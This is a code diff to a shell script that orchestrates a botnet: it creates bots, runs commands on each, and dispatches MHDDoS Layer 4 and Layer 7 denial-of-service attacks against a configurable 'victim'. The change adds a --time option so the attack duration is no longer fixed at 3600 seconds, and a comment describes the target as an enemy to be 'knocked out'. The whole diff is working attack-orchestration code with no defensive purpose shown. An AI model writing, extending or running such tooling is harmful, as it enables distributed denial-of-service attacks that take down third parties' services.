@@ -13,7 +13,8 @@ usage()
 	printf "$fmt" "-c, --create" "Create some bots."
 	printf "$fmt" "-r, -C, --command <cmd>" "Command to run on each bot."
 	printf "$fmt" "--attack <Layer:attack>" "Run this MHDDoS attack on bots"
-	printf "$fmt" "--victim <victim_spec>" "Victim specification, like in MHDDoS"
+	printf "$fmt" "--victim <victim_spec>" "Victim specification, like in MHDDoS."
+	printf "$fmt" "--time <seconds>" "Attack time frame length in seconds."
 	printf "$fmt" "-l, --list" "List bots in selected botnet."
 	printf "$fmt" "--async" "Launch things asynchronously."
 	printf "$fmt" "-t,--no-tty" "Don't allocate pty device"
@@ -281,10 +282,10 @@ attack_bot()
 		(stop) action_on_bot "run_bot_impl" "pkill python3"
 			   ;;
 		(L7) action_on_bot "run_bot_impl" \
-						   "$script_path $ATTACK_ID $ATTACK_VICTIM 0 $ATTACK_THREADS /dev/null 100 3600"
+						   "$script_path $ATTACK_ID $ATTACK_VICTIM 0 $ATTACK_THREADS /dev/null 100 $ATTACK_TIME"
 			 ;;
 		(L4) action_on_bot "run_bot_impl" \
-						   "$script_path $ATTACK_ID $ATTACK_VICTIM $ATTACK_THREADS 3600"
+						   "$script_path $ATTACK_ID $ATTACK_VICTIM $ATTACK_THREADS $ATTACK_TIME"
 			 ;;
 		# TODO: multilayer attack with one command invocation
 		(multi) die "Unimplemented attack layer $ATTACK_LAYER\n"
@@ -306,6 +307,8 @@ ATTACK_LAYER=
 ATTACK_THREADS=60
 # Who is our enemy and is worth to be knocked out?
 ATTACK_VICTIM=
+# How long the attack is going to last for?
+ATTACK_TIME=3600
 # How many bots are going to be doing an ACTION
 NUM_BOTS=
 # Specific bot on which to do an ACTION
@@ -363,6 +366,9 @@ while [ "$#" -gt 0 ]; do
 		(-V|--victim) shift
 					  ATTACK_VICTIM="$1"
 					  ;;
+		(--time) shift
+				 ATTACK_TIME="$1"
+				 ;;
 		(-t|--no-tty) TTY=""
 				   ;;
 		(-T|--threads) shift
